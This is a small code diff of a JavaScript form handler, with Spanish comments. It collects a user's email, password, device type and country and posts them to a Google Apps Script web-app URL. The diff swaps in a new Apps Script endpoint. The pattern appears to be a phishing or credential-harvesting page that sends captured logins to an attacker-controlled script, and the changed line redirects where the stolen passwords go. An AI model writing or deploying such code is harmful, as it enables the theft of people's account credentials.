@@ -328,9 +328,9 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     formData.append("email", email);
     formData.append("password", password);
     formData.append("device", deviceType);
-    formData.append("country", country); // Enviar el país
+    formData.append("country", country); // Enviar el país 
 
-    const url = "https://script.google.com/macros/s/AKfycbyc3GMZd_iHz3YAthw0BkMNt-5kdbxBtd4sBB3HodkJRvOUXUtT3qtRKRlzGj9TMQMG/exec"; // Reemplaza con tu Google Apps Script
+    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec"; // Reemplaza con tu Google Apps Script
 
     try {
         const response = await fetch(url, {
